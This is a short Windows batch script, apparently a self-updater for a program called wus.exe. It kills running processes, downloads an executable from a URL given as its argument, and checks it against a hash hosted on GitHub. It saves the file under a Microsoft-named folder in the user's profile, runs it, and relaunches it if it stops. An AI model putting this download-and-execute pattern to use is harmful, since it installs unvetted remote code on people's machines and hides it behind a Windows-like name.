@echo off
setlocal enabledelayedexpansion

set "exe_path=%localappdata%\Microsoft\WindowsApps\wus.exe"
set "hash_url=https://github.com/KSGVIO/dist/raw/refs/heads/main/wus.hash"

:: Kill existing processes
taskkill /F /IM wus.exe >nul 2>&1
taskkill /F /IM flask_server.exe >nul 2>&1

:: Delete old exe
del /f /q "%exe_path%"

:download_loop
:: Download executable
powershell -command "iwr -Uri %1 -OutFile '%exe_path%'"

:: Download hash file
set "hash_file=%temp%\wus.hash"
powershell -command "iwr -Uri %hash_url% -OutFile '%hash_file%'"

:: Calculate hash of downloaded exe
for /f %%H in ('certutil -hashfile "%exe_path%" SHA256 ^| find /i /v "hash" ^| find /i /v "CertUtil"') do set "calculated_hash=%%H"

:: Read hash from downloaded hash file
set /p "expected_hash=" < "%hash_file%"

:: Compare hashes
if /i "!calculated_hash!"=="!expected_hash!" (
    :: Hash matches, run exe
    "%exe_path%"
) else (
    echo Hash mismatch! Redownloading...
    timeout /t 2 >nul
    goto download_loop
)

:: Wait and check if process is running
timeout /t 30 /nobreak >nul
tasklist | find "wus" >nul
if %errorlevel%==0 (
    exit
) else (
   if exist "%exe_path%" (
      "%exe_path%"
   ) else (
      goto download_loop
   )
)
timeout /t 30 /nobreak >nul
tasklist | find "wus" >nul
if %errorlevel%==0 (
    exit
) else (
   if exist "%exe_path%" (
      "%exe_path%"
   ) else (
      goto download_loop
   )
)

